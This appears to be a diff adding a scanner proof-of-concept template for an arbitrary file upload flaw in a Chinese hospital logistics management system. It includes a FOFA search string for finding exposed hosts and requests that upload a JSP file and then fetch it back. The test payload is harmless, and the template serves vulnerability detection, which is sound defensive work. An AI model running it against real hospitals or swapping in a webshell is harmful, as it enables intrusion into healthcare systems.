@@ -1,0 +1,33 @@
+id: poc-yaml-hospital-one-stop-logistics-processapkupload-upload-anyfile-upload
+info:
+  name: 医院一站式后勤管理系统 processApkUpload.upload 任意文件上传漏洞
+  severity: critical
+  tags:
+  - 文件上传
+  finger: 医院一站式后勤管理系统
+  fofa: body="frameworkModuleJob"
+variables:
+  t1: random_str(4)
+  t2: base64(t1)
+requests:
+- method: POST
+  path: /ajaxinvoke/frameworkModuleJob.processApkUpload.upload
+  headers:
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFQqYtrIWb8iBxUCx
+  data: '------WebKitFormBoundaryFQqYtrIWb8iBxUCx
+
+    Content-Disposition: form-data; name="Filedata"; filename="{{.t1}}.jsp"
+
+    Content-Type: application/octet-stream
+
+
+    {{.t2}}
+
+    ------WebKitFormBoundaryFQqYtrIWb8iBxUCx--'
+  expression: status_code == 200 && contains(body,"\"success\":true")
+  output:
+  - regex_match(body,`apk/(?P<id>[0-9]{1,4})/`)
+- path: /apk/{{.id}}/{{.t1}}.jsp
+  expression: status_code == 200 && body == t2
+  method: GET
+transport: http
